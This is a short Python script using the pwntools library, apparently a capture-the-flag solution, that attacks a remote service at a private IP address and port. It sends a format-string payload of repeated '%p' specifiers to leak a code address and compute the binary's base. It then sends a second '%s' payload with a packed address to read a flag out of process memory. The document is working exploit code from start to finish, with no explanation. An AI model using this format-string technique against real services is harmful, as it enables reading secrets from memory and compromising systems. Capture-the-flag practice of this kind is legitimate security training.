from pwn import *


def main():
    r = remote("10.113.184.121", 10055)
    payload = b"%p " * 0x2D + b"\n"
    off = 0x11E9
    r.send(payload)
    text_leak = int(r.recvline().split(b" ")[-2], 16)
    print(f"{text_leak = :x}")
    text_base = text_leak - off
    print(f"{text_base = :x}")

    flag_addr = text_base + 0x4040

    payload = b"%p" * 0xB + b"\n" + b"%s"
    payload = payload.ljust(0x20, b"\x00")
    payload += p64(flag_addr)
    r.send(payload)
    r.recvline()
    print(r.recvline().decode().strip())


if __name__ == "__main__":
    main()
